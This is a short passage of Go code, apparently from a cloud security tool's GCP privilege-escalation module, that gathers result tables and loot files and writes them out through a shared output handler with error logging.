	output := PrivescOutput{Table: tables, Loot: lootFiles}

	scopeNames := make([]string, len(m.ProjectIDs))
	for i, id := range m.ProjectIDs {
		scopeNames[i] = m.GetProjectName(id)
	}

	err := internal.HandleOutputSmart(
		"gcp",
		m.Format,
		m.OutputDirectory,
		m.Verbosity,
		m.WrapTable,
		"project",
		m.ProjectIDs,
		scopeNames,
		m.Account,
		output,
	)
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error writing output: %v", err), globals.GCP_PRIVESC_MODULE_NAME)
	}
}
